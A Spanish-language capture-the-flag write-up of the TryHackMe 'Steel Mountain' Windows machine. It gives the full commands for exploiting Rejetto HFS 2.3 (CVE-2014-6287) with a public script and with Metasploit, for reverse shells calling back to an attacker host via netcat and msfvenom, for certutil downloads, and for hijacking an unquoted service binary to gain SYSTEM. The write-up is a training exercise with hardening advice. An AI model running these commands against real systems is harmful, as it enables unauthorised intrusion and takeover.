# Steel Mountain — TryHackMe

**Plataforma:** TryHackMe
**Sistema operativo:** Windows Server
**Dificultad:** Media
**Categoría:** Rejetto HFS RCE (CVE-2014-6287), Service Binary Hijacking

## Resumen

Máquina Windows Server que expone un HttpFileServer (Rejetto HFS) 2.3 vulnerable a ejecución remota de comandos (CVE-2014-6287). Tras obtener acceso como usuario estándar, se identifica un servicio con ruta sin comillas (*unquoted service path*) y permisos de escritura para el usuario comprometido, lo que permite escalar a `NT AUTHORITY\SYSTEM` mediante secuestro de binario de servicio.

Se documentan **dos métodos de explotación completos**: uno manual (exploit público) y uno con Metasploit + PowerUp.ps1.

## 1. Reconocimiento

Escaneo completo de puertos:

```bash
nmap -n -Pn -T4 -sS --open -p- --min-rate 4000 <IP>
```

**Puertos descubiertos:** 80, 135, 139, 445, 3389, 5985, 8080, 47001, 49152-49188

Escaneo de versiones:

```bash
nmap -n -Pn -sV -sC -vv --min-rate 3000 -p<puertos> <IP>
```

| Puerto | Servicio |
|---|---|
| 80 | Microsoft IIS 8.5 |
| 135/139/445 | MSRPC / NetBIOS / SMB |
| 3389 | RDP |
| 5985 | WinRM |
| 8080 | HttpFileServer 2.3 (Rejetto HFS) |

En el puerto 80 (página corporativa) se identificó, vía inspección del HTML, al "empleado del mes": **Bill Harper** — dato relevante ya que es el usuario que termina siendo comprometido.

## 2. Análisis de vulnerabilidades

| Puerto | Servicio | Vulnerabilidad |
|---|---|---|
| 8080 | HttpFileServer 2.3 | **CVE-2014-6287** — Remote Command Execution |

## 3. Explotación

### Método A — Manual (exploit público)

Búsqueda de exploit con Searchsploit:

```bash
searchsploit rejetto
searchsploit -m 39161
```

Exploit: *Rejetto HTTP File Server 2.3 - Remote Command Execution* (script Python, dos fases: descarga `nc.exe` desde un servidor controlado por el atacante y luego lo ejecuta para abrir reverse shell).

Preparación:

```bash
cp /usr/share/windows-resources/binaries/nc.exe .
python3 -m http.server 80
nc -lvnp 443
```

Se edita el exploit con la IP del atacante y se ejecuta (requiere Python 2):

```bash
python2 39161.py <IP_víctima> 8080
```

Resultado: shell inversa como usuario **bill**.

```
C:\Users\bill\...>whoami
steelmountain\bill
```

**Flag de usuario** en `C:\Users\bill\Desktop\user.txt`.

### Método B — Metasploit + PowerUp.ps1 (alternativo)

```
msf6 > search rejetto
msf6 > use exploit/windows/http/rejetto_hfs_exec
msf6 > set RHOSTS <IP_víctima>
msf6 > set RPORT 8080
msf6 > set LHOST <IP_atacante>
msf6 > exploit
```

Se obtiene sesión Meterpreter como `bill`. Se sube y ejecuta **PowerUp.ps1** para enumerar vectores de escalada:

```
upload PowerUp.ps1
load powershell
powershell_shell
. .\PowerUp.ps1
Invoke-AllChecks
```

## 4. Escalada de privilegios

Con **winPEAS** (subido vía `certutil.exe -urlcache -f`) se identificó el hallazgo crítico:

- **Servicio vulnerable:** `AdvancedSystemCareService9`
- Ruta del ejecutable sin comillas (*unquoted service path*)
- Permisos de escritura para el usuario `bill` en el directorio del servicio
- El servicio puede reiniciarse (`CanRestart = True`)

Verificación de permisos:

```
icacls "C:\Program Files (x86)\IObit"
```

Generación de payload malicioso con el mismo nombre que el binario legítimo:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_atacante> LPORT=4444 -f exe -o Advanced.exe
```

Se coloca en `C:\Program Files (x86)\IObit\` y se reinicia el servicio:

```
sc stop AdvancedSystemCareService9
sc start AdvancedSystemCareService9
```

Resultado en el listener:

```
whoami
nt authority\system
```

**Flag de root** en `C:\Users\Administrator\Desktop\root.txt`.

## 5. Herramientas usadas

- Nmap
- Searchsploit
- Python 2/3 (servidor HTTP + exploit)
- Netcat
- WinPEAS
- Msfvenom
- certutil.exe
- Metasploit
- PowerUp.ps1

## 6. Conclusiones y recomendaciones

1. La vulnerabilidad crítica del servidor (HFS 2.3) permitió acceso inicial inmediato.
2. La mala configuración del servicio de Windows (ruta sin comillas + permisos de escritura) permitió escalada directa a SYSTEM.
3. **Recomendación:** retirar software obsoleto, corregir rutas de servicios (encerrarlas entre comillas), restringir permisos de escritura sobre directorios de programas, y aplicar hardening general del sistema.
